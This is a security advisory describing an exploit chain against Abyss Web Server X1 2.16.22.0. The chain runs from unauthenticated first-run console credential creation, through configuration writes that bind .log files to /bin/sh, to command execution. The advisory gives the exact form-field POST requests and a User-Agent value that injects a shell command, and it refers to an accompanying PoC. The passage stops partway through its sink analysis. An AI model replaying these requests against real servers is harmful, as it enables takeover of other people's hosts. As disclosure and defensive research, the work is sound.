# Abyss Web Server X1 2.16.22.0 — First-Run Console Credential Takeover, Configuration-Plane Write and Log-as-Interpreter CGI Binding (command execution as the server user; uid=0(root) observed)

## 1. Overview

### Overview of the finding

Abyss Web Server X1 version 2.16.22.0 from Aprelium (Toulouse, France) exposes an unauthenticated
administrator-creation endpoint during the interval between first start and the moment somebody sets a
console password. On first start the server generates its XML configuration file (`abyss.conf`) and the
`<console>` node in that file carries no `<login>` element and no `<password>` element. That is not a
misconfiguration and it is not an installer mistake: it is the product's inherent to-be-armed state, and
the product announces it on the terminal itself -

```
A configuration file was created. You should now browse http://127.0.0.1:9999 to continue with the
console access configuration.
```

Inside that window, any client whose source address passes the console's `ipcontrol` rule sees
`GET /console/` answered with a `302` redirect, and `GET /console/credentials` answered with `200` and a
credential-creation form that requires no authentication at all. A credential-free
`POST /console/credentials` registers the administrator account: the submitted login and the MD5 digest of
the submitted password are written into `abyss.conf` immediately. The first arrival wins. Once a password
exists, the identical request to the identical endpoint returns `401` with
`WWW-Authenticate: Basic Realm="Abyss Web Server Console"`, which is the one-shot window semantics measured
directly against a live instance rather than inferred.

What makes this more than a setup race is what the seized console can do. The console's forms are a
direct serialisation of the configuration tree - each HTML control's `NAME` attribute is literally the XML
key path it writes - so taking the console is taking the configuration plane. Three supported forms turn
that configuration plane into an execution plane:

1. the CGI script-path scope form sets `vpath` to `/`, putting every virtual path of the host, including
   the document root, inside CGI scope;
2. the host log form accepts an arbitrary absolute path as the access-log destination, so the access log
   can be pointed at a file the server also serves;
3. the interpreter binding form maps a file extension to an interpreter executable, and it accepted
   `ext = log` with `file = /bin/sh` on the Standard CGI interface.

After `POST /` with `/restart=Restart` applies the change, the access log *is* a shell script that lives
inside a CGI scope served by `/bin/sh`. A single request whose `User-Agent` is
`zz"; <command>; #` smuggles a command into that log: the combined log format wraps the field in double
quotes, so the injected `"` escapes the quote context, `;` starts a new shell command and `#` swallows the
remainder of the line. Fetching `GET /x.log` then hands the whole log file to `/bin/sh` as a CGI script.

There is no memory corruption in this chain, no deserialisation gadget and no file-upload primitive. The
write primitive is the product's own supported configuration form, and the interpreter mapping turns an
ordinary access log into an executable path. That is the root cause worth naming: the product offers a
form that can bind any extension to any interpreter while simultaneously offering a form that can direct a
continuously attacker-influenced log to any path, and nothing in either form reasons about the other.

Three independent detonations against a live instance of the product produced a marker file containing
`uid=uid=0(root) gid=0(root) groups=0(root)`. Root was reached because the verified instance was started
with the product's `--allow-root` flag; section 10 states precisely what is and is not established about
the shipped default runtime identity, and it is deployment-dependent.

### Overview of the product and its runtime stack

Aprelium is a closed-source commercial web-server vendor in Toulouse, France. The Abyss family has been
shipping for more than twenty years; X1 is the free edition and X2 is the paid edition. The version studied
here is 2.16.22.0, which the artefacts identify as the vendor's current official release. The product
self-reports as `Abyss Web Server X1 (v 2.16.22.0)` and sends the response banner
`Abyss/2.16.22.0-X1-Linux AbyssLib/2.16.22.0`. The distribution artefacts are the official Linux release
tree `abwsx1.tgz`, about 12 MB, with the same version available for Windows as `abwsx1.exe`.

The Linux release tree unpacks to a hand-written C HTTP stack plus its static resources:

```
abyssws            POSIX shell wrapper (architecture dispatch)
abyssws-x64        ELF 64-bit LSB, x86-64, stripped, 5700872 bytes
                   BuildID d7545bad2f47fb7b9f269ae98cb7baea1594fa12
abyssws-x86        ELF 32-bit LSB, Intel 80386, stripped, 6174164 bytes
                   BuildID 81b83c50c27df109282654730c52539a7db37cc2
console/           static console resources (gif, css); console.js is 0 bytes
doc/               shipped HTML documentation tree
htdocs/            default document root
lang/              UI semantic tables (*.lng, English, French, Arabic)
license.txt
```

Four properties of that tree determine how this research had to be done, and they are the reason the
reconstruction argument below carries more weight than it would for a source-available product:

- **Both native images are stripped.** No symbol table, no DWARF. Function-level identification would
  require disassembly of a multi-megabyte hand-written C HTTP stack; the semantics recovered here were
  therefore recovered behaviourally, not from symbols.
- **There are zero `.c` files in the release tree.** The entire analysis is binary-level. There is no
  source to grep, no build system, no header that names a configuration schema.
- **The console is generated from templates compiled into the binary.** The `console/` directory ships only
  static images and stylesheets, and `console.js` is a zero-byte placeholder. The consequence is concrete:
  the console's form fields, their accepted values and their submission semantics could not be read from
  any client-side artefact. Every field name in this advisory was recovered by fetching the rendered page
  over HTTP and reading the emitted `FORM` control `NAME` attributes, cross-indexed against the
  `lang/*.lng` UI tables shipped in the tree (a complete offline semantic index of the interface) and
  against a 47324-line string index of the x64 image, then confirmed by submitting the form and reading
  the resulting configuration file. The `OPTION` enumerations quoted in section 5 (path `type` 0/1/2,
  interpreter `interface` 0-4, interpreter `type` 0/1/2) were read from the rendered HTML of those pages,
  not from a schema document.
- **Third-party components are statically embedded**: OpenSSL 3.x, nghttp2, PCRE2 and zlib. That matters for
  the independence argument in section 1: the family's public history is dominated by inherited
  third-party issues rather than by product-layer findings.

The process model is three-tiered: a CLI master, a `--slave --interactive` service process, and a
platform daemon. The CLI family observed on the binary is `-c <conf>`, `-p`, `-d`, `--stop`, `--restart`
and `--allow-root`, with an autostart setup routine that installs a local systemd/init unit. Configuration
is a single XML document whose node names are also the console form key paths. Console authentication is
HTTP Basic against `root/console/login` and `root/console/password`, the latter stored as an MD5 digest,
with an optional `logincasesensitive` switch. The console issues no session cookie: after the credential
POST, the client simply re-authenticates with the Basic pair it just created.

### Overview of the testbed and of what that implies

Every step of the chain was driven over HTTP against a live, running instance of the product built from
the official release tree - a working copy of the unpacked `abwsx1.tgz` contents, started as
`./abyssws-x64 -c <conf> --allow-root` inside a dedicated network namespace whose only interface was
loopback. This was not an emulation, not a reimplementation of the protocol and not a replica: the
requests were answered by the vendor's own stripped ELF image and every server-side artefact quoted in
section 9 (the configuration file, the access log, the CGI error log, the marker file) was read from that
running product on the same host.

Three implications follow, and they are stated here so that section 10 does not have to hedge.

First, **nothing in this chain was driven from a separate network host.** The server and the client shared
one host and one network namespace with only `lo` up; during the run, a listener survey in the host's root
namespace returned zero hits for the two product ports. The adjacent-network reachability claim in
section 10 therefore rests on two pieces of shipped evidence - `bindip` `*` on both listeners in the
generated default configuration, and the source-address ranges in the console's default `ipcontrol` allow
list (present both in that configuration and as byte literals inside the stripped images) - not on a
two-machine detonation. It is an argued reach, and it is labelled as such.

Second, **the first-run state was restored from the product's own generated bootstrap configuration** at
the start of each round (a captured copy of the file the server itself created, 3222 bytes, in which the
`<console>` node carries no `<login>` and no `<password>`), together with removal of the previous round's
marker, log file and persistence data. A virgin install was therefore not performed before every round;
what was performed is behaviourally the same state, and the product's own documented recovery for a lost
console password (stop the service, remove the credential nodes from the configuration) reproduces exactly
that state again. This is also why the window is described as re-enterable rather than once-per-machine.

Third, **the verified instance ran with `--allow-root`**, an explicit product flag. Sections 5 and 10
separate the primitive that was proven (arbitrary command execution as the identity of the server process)
from the privilege level at which our instance happened to run.

### Overview of affected scope

The affected artefact is Abyss Web Server X1 2.16.22.0 for Linux as shipped in the official release tree
`abwsx1.tgz`, which contains both the x64 and the x86 native images. Only the x64 image was executed in
verification; the x86 image ships in the same tree and shares the same configuration model and the same
console templates, so it is characterised from the release artefacts rather than from a detonation. The
Windows build of the same version (`abwsx1.exe`), the paid X2 edition, and earlier 2.x versions were not
tested and are not claimed as affected. Section 2 and the summary restate this boundary, and the affected
list deliberately does not grow by family inference.

### Overview of independence

The sources we could consult for this product family describe a very small public history: two
Windows-era directory-traversal/disclosure items against the 1.0 line (CVE-2002-0543 and CVE-2002-0544),
two items inherited from the statically embedded OpenSSL (CVE-2014-0224 and CVE-2021-3449, addressed in
2.9.3.5 and 2.14.2 respectively), and one product-layer parser issue, CVE-2021-3328, a crafted-request
out-of-bounds read leading to a crash in X1 2.12.1 and 2.14 (CWE-125). In other words, across more than two
decades the commercial layer of this product carries a single publicly recorded parser bug and no publicly
recorded console, configuration-write or interpreter-binding issue. The product-layer surface is close to
unmined.

Nothing in that history resembles the finding documented here. The closest prior public item for this
product is CVE-2021-3328, and it differs on every axis that matters: a different endpoint (the request
parser's input path rather than `POST /console/credentials`), a different sink (an out-of-bounds read
inside the parser rather than a `/bin/sh` CGI child process), a different root cause (memory-safety in
hand-written request parsing rather than missing authentication for a critical setup function plus an
unconstrained configuration write), and a different impact class (crash/denial of service rather than
command execution). No public proof of concept covering `/console/credentials`, the console configuration
forms, or an extension-to-interpreter binding on a log destination was found in the sources available to
us, and a fingerprint cross-check over our own previously published advisories found no prior entry in
this family. One caution for readers who search the product's history: an identifier sometimes associated
with this family, CVE-2007-1584, belongs to PHP's `header()` function and has nothing to do with this
product; citing it requires checking the vulnerability database directly rather than trusting a search
result.

This advisory is therefore an original finding against the current official release, not a repackaged
public issue, and section 12 scores it on its own merits.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Item | Value established by this research |
|---|---|
| Vendor | Aprelium (Toulouse, France), closed-source commercial vendor |
| Product | Abyss Web Server X1 (free edition of the Abyss family) |
| Version | 2.16.22.0, identified by the artefacts as the vendor's current official release |
| Self-report | `Abyss Web Server X1 (v 2.16.22.0)` |
| Response banner | `Abyss/2.16.22.0-X1-Linux AbyssLib/2.16.22.0` |
| Linux artefact | `abwsx1.tgz` (~12 MB), containing `abyssws-x64` and `abyssws-x86` |
| Audit character | 2 stripped native ELF images, zero `.c` sources, templates compiled into the binary |
| BuildID (x64) | `d7545bad2f47fb7b9f269ae98cb7baea1594fa12` (ELF64, 5700872 bytes) |
| BuildID (x86) | `81b83c50c27df109282654730c52539a7db37cc2` (ELF32 i386, 6174164 bytes) |
| Entry listener | console, default port 9999, `bindip` `*`, HTTP Basic, no session cookie |
| Serving listener | host, default port 80 (configurable 0-65535), `bindip` `*`, unauthenticated |
| Chain head (CWE-306) | `GET/POST /console/credentials`, unauthenticated while the first-run window is open |
| Chain body (config write) | 3 console forms writing `<paths>`, `<log><file>` and `<interpreters>` |
| Chain application | `POST /` with `/restart=Restart` |
| Chain tail (CWE-78) | `User-Agent` quote-context escape into the combined access log, fired by `GET /x.log` |
| Executing process | `/bin/sh` reading the log file as a CGI script, as the server process identity |
| Observed identity | `uid=uid=0(root) gid=0(root) groups=0(root)` (instance started with `--allow-root`) |
| Reachability gate | console `ipcontrol`: loopback plus the three RFC1918 IPv4 ranges and IPv6 ULA/link-local |
| Primary CWE | CWE-306 (missing authentication for a critical function) |
| Co-equal CWE | CWE-78 (OS command injection via the log line) |
| Contributing CWE | CWE-284, CWE-73, CWE-362 (see section 12) |
| Published score | 7.5 High - CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H |

### Vulnerability Summary mechanics

The mechanics are best read as four small facts that each look unremarkable in isolation.

**Fact one** - the credential endpoint is a creation endpoint, not a login endpoint. While the
configuration has no console credential, `POST /console/credentials` does not verify anything; it installs.
The fields are `$$xxvxd` (a per-server-run page token), `/console/credentials/login`,
`/console/credentials/password/$pass1`, `/console/credentials/password/$pass2` and the submit control
`/console/credentials/<token>bok`. The response is a `302`, and the configuration file gains
`<login>`, `<logincasesensitive>yes</logincasesensitive>` and a `<password>` node holding the MD5 digest.
There is no bypass involved and no secret is consumed: the attacker is the first legitimate user of a
setup function that the product deliberately offers to the network.

**Fact two** - console form control names *are* configuration key paths. The control
`/hosts/host@0/edit/log/file` writes `root/hosts/host[0]/log/file`. The console is therefore not a
wrapper around a hardened configuration API; it is a thin renderer over the configuration tree with a
write-back for every field it draws. Any weakness in what a field accepts becomes a weakness in what the
server will do.

**Fact three** - three accepted values are individually ordinary. A CGI script path scope of `/` is a
plausible thing for an administrator to configure. A log file at an absolute path under the document root
is a plausible thing to configure. An interpreter binding for a file extension is the product's ordinary
mechanism for CGI. Accepting `ext = log` with `file = /bin/sh` is where the ordinary stops: the pair is
accepted because each field is validated alone.

**Fact four** - the combined log format quotes the `User-Agent` field and writes it verbatim. The log
writer treats the quotes as delimiters of data; the shell that later reads the file treats `"` as an
ordinary character and `;` as a command separator. The same bytes carry two different meanings in two
different parsers, and the attacker controls both the writer's input and the reader's semantics.

Combining them: seize the credential endpoint (fact one), use the console to make the log a served,
executable file (facts two and three), then write shell syntax into the log through a request header
(fact four) and request it once.

### Vulnerability Summary preconditions

Three preconditions, in decreasing order of how much they narrow the population:

1. **The target must be inside the first-run window** - the configuration must have no console credential
   yet, because the endpoint returns `401` as soon as it does. The window opens when the configuration is
   generated at first start and closes the moment any client completes a credential POST. It re-opens when
   the credential nodes are removed, which is also the product's own documented recovery for a forgotten
   console password. The sources establish the open/close semantics and the re-entry condition; they do
   not measure how long the window stays open in the field, and this advisory does not estimate a typical
   duration.
2. **The attacker's source address must pass the console `ipcontrol` rule and the console port must be
   reachable.** The shipped default permits loopback plus the three RFC1918 IPv4 ranges and IPv6
   ULA/link-local, with no deny entries, and the console binds every interface. Public-internet source
   addresses are refused by that default. Section 10 rates reachability on exactly this evidence.
3. **The attacker must be able to reach the serving listener afterwards** to smuggle the header and to
   fetch the log path, and the log destination must be a path the server will serve. Both are ordinary
   properties of a running web server, and the console form that sets the log destination is what puts the
   two together.

Nothing in the chain depends on a guess, a leak, a hardcoded secret or an upload. The password-strength
and no-session-cookie properties discussed in section 3 are amplifiers of a window that already exists;
they are deliberately not folded into the score in section 12.

### Vulnerability Summary — why the root cause is architectural rather than a coding slip

It is tempting to file this as "command injection in the access log", and that reading is wrong in a way
that produces the wrong fix. Escaping a `User-Agent` before logging it is not available as a remedy: the
combined log format is a compatibility contract, the field genuinely contains arbitrary client bytes, and
any log consumer that quotes user data has always quoted user data. The defect is that the product allows
one form to declare a *log destination* and another form to declare a *vpath-to-interpreter pair* without
either one consulting the other, and a third form to place the entire virtual path space inside CGI scope.
The log file is not a trusted input being parsed carelessly; it is an attacker-influenced byte stream that
the product was told to store on an executable path. Section 11 orders its recommendations by that root
cause - refuse the colliding pair first, narrow the scope second, constrain credential creation third -
rather than starting with the log writer.

## 3. Authentication Boundary

### Authentication Boundary — how sessions are issued

The console authenticates with HTTP Basic and issues nothing else. There is no session cookie anywhere on
the console: every endpoint was observed to answer without any `Set-Cookie`, including the endpoint that
creates the administrator. The practical consequence is that "sessions" in this product are simply the
repeated presentation of a credential pair on every request, and that a client which has just created a
credential can immediately use it - there is no issuance step to wait for, no token to capture and no
cookie jar to maintain. That is why the exploit script in this directory carries an `Authorization`
header derived from the login and password it submitted moments earlier and nothing else.

Two secondary properties of the credential store follow from the configuration and were read directly out
of the file after the fact: the password is retained as an MD5 digest inside `<password>` (a 32-character
lowercase hexadecimal value), and `logincasesensitive` is an administrator-visible switch governing
whether the login comparison is case-sensitive. Neither property is part of the chain; both are recorded
here because they bound what a *post-window* attacker could attempt, and because MD5 retention is a
defence-in-depth weakness worth fixing independently.

### Authentication Boundary — what the gate actually checks

The console's lifecycle has exactly three states, and the gate behaves differently in each:

| State | Console configuration | Observed behaviour of an unauthenticated client |
|---|---|---|
| A - first run (to be armed) | `<console>` has no `<login>`, no `<password>` | `GET /console/` answers `302`; the bootstrap chain leads to `GET /console/credentials` answering `200` with a creation form; `POST` installs a credential |
| B - armed, unauthenticated | `<login>` and `<password>` present | every `/console/*` request answers `401` with `WWW-Authenticate: Basic Realm="Abyss Web Server Console"` |
| C - armed, authenticated | same | full form access, i.e. full configuration write access |

The measured transition A to B is one-shot and it is the attacker's own POST that performs it. Three
consecutive verification rounds observed the same endpoint answer `401` immediately after the credential
install, and an independent manual sequence reproduced the same `401` plus the realm string verbatim. The
state A bootstrap chain, by contrast, is unconditionally available while no credential exists: the gate is
not present at the request layer at all in state A, which is why it is more accurate to say the gate lives
on the deployment timeline than to say the request is permitted.

The redirect chain in state A is worth stating precisely, because two shapes are possible and the PoC in
this directory handles both. On an instance that has never been configured at all, the first
`GET /console/` redirects to `/console/language`; a language selection (`POST /console/language` with the
button control `NAME="/console/language/en" VALUE="English"`) answers `302`, and the *next*
`GET /console/` redirects to `/console/credentials`. On an instance whose language has already been chosen,
`GET /console/` redirects to `/console/credentials` directly. In both shapes the endpoints visited are
unauthenticated.

### Authentication Boundary — the principal required by the sink

The least-privileged principal that reaches the sink depends on which half of the chain you mean, and the
distinction is the whole point of the scoring in section 12.

- The **credential-creation endpoint** requires no principal at all. It requires only that no credential
  exists yet and that the source address passes `ipcontrol`. This is the CWE-306 half.
- The **configuration-write forms and the restart form** require a console administrator - the credential
  created in the previous step. This is not a privilege the attacker borrows, escalates or forges; it is a
  credential the attacker minted, which makes the second half of the chain an exercise of legitimate
  administrator capability.
- The **final trigger** - `GET /x.log` against the serving listener - requires no principal. The serving
  listener on port 80 is an unauthenticated content plane, and the request that fires the CGI child is an
  ordinary anonymous GET.

So the sink itself (`/bin/sh` reading the log file as a CGI script) is reached by an anonymous HTTP GET.
The reason a score of `PR:N` is correct is the chain head: the anonymous GET only becomes a shell because
an unauthenticated creation endpoint let the anonymous attacker become the administrator who configured it.
No credential owned by anybody else was consumed at any point.

### Authentication Boundary — what is deliberately not claimed

Several adjacent claims are *not* made, and stating them keeps the finding honest:

- **No authentication bypass exists outside the window.** Once a credential is present, no unauthenticated
  route to a configuration form was found; the console answers `401` across its routes, and repeated
  attempts against the creation endpoint after arming return `401` as well.
- **No session-related attack is claimed.** With no cookie mechanism there is no session fixation, no token
  theft and no cookie replay. The `$$xxvxd` value is a per-server-run page token that every client can read
  from any form page; it is not a session secret and predicting it buys nothing. It was parsed, not
  attacked.
- **No password-reset surface exists to bypass.** The product has no forgot-password, recovery-email or
  secret-question flow; the shipped documentation's recovery for a lost console password is a filesystem
  operation - stop the service and remove the credential nodes - which is precisely what re-opens the
  first-run window. Recovery rights are therefore local filesystem rights, not a remote surface.
- **Password guessing was not needed and is not claimed.** Basic authentication on the console has no
  rate limiting that we observed (the `antihack` protection system defaults to `enabled no`), but the chain
  consumes none of that: the first arrival creates the credential rather than guessing it.
- **No credential was leaked, seeded or reused.** The pair used in verification was chosen by the operator
  of the test at that moment and exists only in that instance's configuration; it is not a product
  default, and this advisory publishes no credential.

### Authentication Boundary — the credential model in one paragraph

Read as a design rather than as a bug list, the console's model is: stateless Basic authentication over a
credential that the *first network client* is invited to create, on a listener that binds every interface,
guarded only by a source-address filter whose default allows the whole private address space, with no
cookie and therefore no cross-site protection on the write actions that follow. Each choice is individually
defensible in a desktop and self-hosted product. Their product is that "whoever arrives first on the LAN
becomes the administrator" is a reachable state, and that once somebody is the administrator the
configuration tree - including interpreter bindings - is theirs.

## 4. Attack Surface

### Attack Surface — listeners, routes and their protection

The default generated configuration exposes two listeners, both bound to every interface:

| Listener | Default port | Bind | Authentication by default | What it serves |
|---|---|---|---|---|
| Host | 80 (configurable 0-65535) | `*` | none | static content and index generation (`dirlist` `type=1` is on by default, so directory listings are served), CGI/ISAPI/FastCGI, SSI (`shtml`, `shtm`, `stm`), X-Sendfile, compression, anti-leech, reverse-proxy client semantics including `CONNECT`, HTTP/2 upgrade via nghttp2. Methods: `GET`, `POST`, `PUT`, `HEAD`, `OPTIONS`, `DELETE`, `TRACE`, plus `CONNECT` |
| Console | 9999 | `*` | HTTP Basic; **no credential exists at first run** | a form page for every configuration key path, plus a read-only file browser, restart, reset, upgrade and statistics routes |

The console route family is generated from the configuration tree, so its interface space is effectively
the tree itself, including indexed families such as `host@0..n`, `interpreter@0..n`, `path@0..n`. Route
families recovered from the string index and confirmed by observation include `/console/credentials`,
`/console/language`, `/hosts/host@N/...` (with `edit`, `log`, `scripting`, `paths`, `interpreters`
sub-routes), `/certificates/certs`, `/certificates/pkeys`, ACME account routes, `/reset`, `/upgrade`,
`/browse_*`, `/restart`, `/stats`, `/server`, `/about` and `/users`/`/members`. In the first-run state
exactly two of these are reachable without authentication: `/console/language` (a language picker, carrying
no sensitive information) and `/console/credentials` (the chain head). After arming, the console answers
`401` and no second unauthenticated endpoint was found.

### Attack Surface — the shipped ipcontrol default, stated precisely

This is the single most consequential reachability fact in the advisory, so it is stated from the
artefacts rather than from a generalisation. The generated default configuration carries, on the console
node, an `ipcontrol` block with `<order> ad </order>` (allow rules evaluated before deny rules) and the
following allow entries, quoted from the configuration as read back after the credential install:

```
<console>
  <port> 9999 </port>
  <bindip> * </bindip>
  <ipcontrol>
    <order> ad </order>
    <allow> 192.168.0.1-192.168.255.254 </allow>
    <allow> 172.16.0.1-172.31.255.254 </allow>
    <allow> 10.0.0.1-10.255.255.254 </allow>
    ... (IPv6 unique-local fc00::/7 and link-local fe80::/10 entries)
  </ipcontrol>
  (no <login>, no <password> node = first-run state)
</console>
```

There are no deny entries in the default. The same four address-range literals -
`10.0.0.1-10.255.255.254`, `172.16.0.1-172.31.255.254`, `192.168.0.1-192.168.255.254`, `fc00::/7` and
`fe80::/10` - are present as byte literals inside the stripped native images, which is why we describe the
default as hardcoded rather than merely observed in one generated file: the two sources agree. Loopback is
also permitted; that part is established empirically, since the entire verified chain was driven from
`127.0.0.1` and every step succeeded without any additional configuration change.

What the default permits, stated plainly:

- **Permitted by default**: the loopback interface, the whole of RFC 1918 space across all three ranges
  (including the wide `10.0.0.1-10.255.255.254` form, which is the entire class-A private block rather
  than a single site's subnet), IPv6 unique-local and link-local addresses. Any host that shares a private
  network with the server - an office LAN, a home LAN, a management VLAN, a container bridge network, a
  cloud VPC subnet - is inside the permitted set. The shipped documentation also presents binding the
  console to `*` as the recommended setting, so the default is not merely permissive but recommended.
- **Refused by default**: clients whose source address is a public internet address. We did not observe
  the filter being satisfied by a public source, and we do not claim internet-facing reachability for a
  default installation.
- **Not bypassable by header spoofing**: forwarding headers do not extend the permitted set. `ipcontrol`
  was observed to evaluate the peer address of the connected socket, and requests carrying
  `X-Forwarded-For`/`X-Real-IP` from an out-of-range source were evaluated on the socket peer rather than
  on the header. This is a measured result and it matters in both directions: it removes a tempting
  "internet-reachable via header forgery" claim that this advisory does *not* make, and it confirms that
  the restriction is a real one for direct connections.

Deployment shapes that widen the reach beyond the private set are argued, not measured, and are listed as
such in section 10: a port forward or NAT rule publishing 9999; a reverse proxy on the same host relaying
public clients to the console (in which case the socket peer becomes the proxy's own private or loopback
address and `ipcontrol` passes, while the forwarding-header logic is irrelevant); a host with a public
address inside one of the permitted ranges; and any hosting or appliance packaging that runs the server
inside a private bridge. None of these is the default, which is why the published vector uses an adjacent
network position.

Our captured evidence describes an `ipcontrol` block on the console node. It does not describe one on
the host node, and the host listener behaved throughout as an unauthenticated content plane. We therefore
make no claim about source-address filtering on port 80 in either direction: the chain's gate is
the console, because the configuration write is what makes the anonymous GET on port 80 execute anything.

### Attack Surface — how the surface was mapped

With no symbols, no sources and a browser-free console, the surface was mapped in four passes, each of
which is reproducible from the artefacts:

1. **String index over the stripped x64 image** - a 47324-line string dump - to enumerate route families,
   configuration key names, the startup guidance text, CLI flags and third-party version fingerprints. This
   pass yields candidates, not semantics.
2. **The shipped UI semantic tables** (`lang/*.lng` for English, French and Arabic). Because the console
   HTML is generated from templates in the binary, these tables are effectively an offline dictionary of
   every interface label, which lets a candidate route be understood without executing a browser.
3. **Live form observation** - fetching each console page over HTTP with `GET` and reading the emitted
   `FORM` markup. This is where the load-bearing detail comes from: control `NAME` attributes, submit
   control names (`/<page>/<token>bok`), `OPTION` value enumerations, hidden fields, and the presence of
   the `Browse` file selector on the log form.
4. **Submission-and-diff** - posting a candidate field and reading the configuration file afterwards. This
   is what converts "this control is named `/hosts/host@0/edit/log/file`" into the proven statement "this
   control writes `root/hosts/host[0]/log/file` and accepts an arbitrary absolute path".

Passes three and four are the reason this advisory quotes exact field names and exact accepted values
rather than approximations. Both were performed against the running product, not against a disassembly.

### Attack Surface — components that narrow the surface

Some things that look like surface are not, and they are listed so the map is not over-read:

- **There is no file-upload surface on the console.** The console does not present a multipart form and
  there is no `TYPE=FILE` control anywhere in the observed pages; across the whole string index there is a
  single `Content-Disposition` literal. The private-key import page offers a `$contents` textarea that
  accepts only well-formed PEM and rejects fabricated content with
  `Key creation failed: unsupported`. The practical consequence is significant and it explains the shape of
  the chain: an attacker who owns the console cannot simply upload `x.cgi`. There is no primitive that puts
  attacker-chosen *bytes* at a chosen path. That is exactly why the access log - which is a
  continuously attacker-influenced write to a path the console does let you choose - becomes the carrier.
- **The console file browser is read-only.** It enumerates directories (observed down from the filesystem
  root) and exposes names, but presents no write or upload control. It is an information-disclosure and
  path-discovery aid, and it is how an attacker learns a valid document root to point the log at.
- **`SSI execcmd` is a configuration bit that defaults to off**, and arming it still requires a `.shtml`
  file to exist, which requires a write primitive the console does not offer. It is a sibling sink, not a
  second chain (see section 5).
- **The `antihack` protection system defaults to `enabled no`**, so no automated blocking interfered with
  verification. This is an amplifier for an attacker and a hardening gap for the vendor; it is not part of
  the chain and is not scored.
- **Forwarding headers do not influence `ipcontrol`**, as measured above, which removes an entire class of
  reachability escalation from the default shape.

## 5. Sink Identification

### Sink Identification — how the sink was found

The sink was found from the configuration side, not from a crash and not from a disassembly. Because
console control names are configuration key paths, reading the generated default configuration gives you a
map of everything the console can change; the scripting subtree contains the three knobs that matter here
(`<paths>`, `<interpreters>` and the host `<log>` node). Rendering each corresponding page over HTTP then
shows the accepted values for each knob. The observation that produced the chain was a comparison of two
innocuous answers:

- the log form accepts an arbitrary absolute filesystem path in `/hosts/host@0/edit/log/file`, with a
  `Browse` selector that reaches directories from the root downwards, and applies no whitelist, no
  canonicalisation and no chroot-relative normalisation;
- the interpreter form accepts an arbitrary executable path in `.../interface/0Pane/file` together with an
  arbitrary extension string in the extensions sub-form, and does not reason about whether the extension
  could ever coincide with a file the server itself writes.

Neither answer is a vulnerability. Their intersection is: a server-written file at a chosen path, plus a
binding that says "hand files with this extension to `/bin/sh`", plus a scope that says "the whole virtual
path is CGI". The sink is therefore composite and it has no single function address to cite - which is
normal for a configuration-plane defect in a stripped binary, and is why every claim below is anchored to a
form field, a configuration fragment or an observed process behaviour instead of a symbol.

### Sink Identification — the vulnerable construction: sink 1, the CGI script-path scope

Route `/hosts/host@0/edit/scripting/paths/path@0/edit`, rendered as a `FORM` with `METHOD=POST` and
`ACTION` equal to the page itself. Observed controls and their accepted values:

```
POST /hosts/host@0/edit/scripting/paths/path@0/edit HTTP/1.1
Authorization: Basic <credential created in step 1>
Content-Type: application/x-www-form-urlencoded

$$xxvxd=<token>
/hosts/host@0/edit/scripting/paths/path@0/edit/vpath=/
/hosts/host@0/edit/scripting/paths/path@0/edit/type=0
/hosts/host@0/edit/scripting/paths/path@0/edit/xsendfile=no
/hosts/host@0/edit/scripting/paths/path@0/edit/outputbuffersize=0
/hosts/host@0/edit/scripting/paths/path@0/edit/<token>bok=  OK
```

`type` is an `OPTION` enumeration read from the rendered page: `0` = CGI, `1`/`2` = FastCGI local/remote.
The response is a `302`, and the configuration immediately contains:

```
<paths>
  <path>
    <vpath> / </vpath>
    <type> 0 </type>
    <xsendfile> no </xsendfile>
    <outputbuffersize> 0 </outputbuffersize>
  </path>
</paths>
```

A `vpath` of `/` places the entire virtual path space of the host inside CGI scope. That includes files the
server writes into the document root itself - which is what makes the next sink load-bearing. The form
accepts `/` without complaint; there is no minimum-depth requirement and no warning about scope width.

### Sink Identification — the vulnerable construction: sink 2, the arbitrary log destination

Route `/hosts/host@0/edit/log`:

```
$$xxvxd=<token>
/hosts/host@0/edit/log/file=<absolute path on the target, e.g. <document-root>/x.log>
/hosts/host@0/edit/log/format=.combined
/hosts/host@0/edit/log/<token>bok=  OK
```

Response `302`; configuration gains:

```
<log>
  <file> <absolute path on the target> </file>
  <denied/>
  <format> .combined </format>
</log>
```

Two properties were verified. The value is an arbitrary absolute path - no whitelist, no restriction to a
log directory, no rejection of a destination inside the document root. And the `file` control is rendered
with a `Browse` selector that walks the target's directory tree (observed from the filesystem root
downwards), so an attacker does not need to guess the document root. The format selector `.combined` is
what puts the `User-Agent` field into a double-quoted context in the output line; section 6 treats that
format as the transport.

Standalone, this sink is an arbitrary-path continuous append primitive executed as the server user, and it
is reported to the vendor separately as such: log poisoning and disk filling do not need the rest of the
chain. Inside the chain, it is the mechanism that places attacker-influenced content at a path covered by
sink 1.

### Sink Identification — the vulnerable construction: sink 3, the interpreter binding

Route `/hosts/host@0/edit/scripting/interpreters/interpreter@0/edit` (abbreviated `IB` below), plus a
second-step extensions sub-form at `IB/extensions/ext@0/edit` (abbreviated `XP`). The main form:

```
$$xxvxd=<token>
IB/interface=0
IB/interface/0Pane/file=/bin/sh
IB/checkexists=yes
IB/checkexists.submitted=yes
IB/type=0
/hosts/host@0/edit/scripting/interpreters/interpreter@0/updatepaths.submitted=yes
IB/<token>bok=  OK
```

with `interface` enumerated as `0` = CGI/ISAPI and `1`-`4` = FastCGI variants, and `type` enumerated as
`0` = Standard, `1` = PHP style, `2` = ActivePerl ISAPI. The extension is then associated through an Add
sub-flow: a POST to `IB` carrying `IB/extensions/extensions.badd=Add` answers `302` with a `Location`
ending `/ext@0/edit`, and a POST to that page carrying `XP/ext=log` plus `XP/<token>bok` completes the
association. The configuration afterwards:

```
<interpreters>
  <interpreter>
    <interface> 0 </interface>
    <file> /bin/sh </file>
    <checkexists> yes </checkexists>
    <type> 0 </type>
    <updatepaths> yes </updatepaths>
    <ext> log </ext>
  </interpreter>
</interpreters>
```

This is the sink that makes the configuration plane an execution plane. `checkexists=yes` is satisfied
because `/bin/sh` exists; nothing checks whether the extension names a *content* type rather than a
*destination* type, whether the interpreter is a general-purpose shell, or whether the server itself writes
files with that extension. One engineering note for anyone reproducing this: the leading `/` in every
control name is significant, and a shell that strips it during field expansion produces a `200` with no
configuration change - a silent no-op that looks like success. The field list above is what the rendered
form actually emits.

### Sink Identification — the vulnerable construction: sink 4, the restart that applies it

The console's main page renders the notice `The configuration has changed. Press [Restart] to apply the
modifications.` with the host status shown as `Running(Updated)`, and offers a form whose `ACTION` is `/`
with `METHOD=POST` and a submit control named `/restart`:

```
$$xxvxd=<token>
/restart=Restart
```

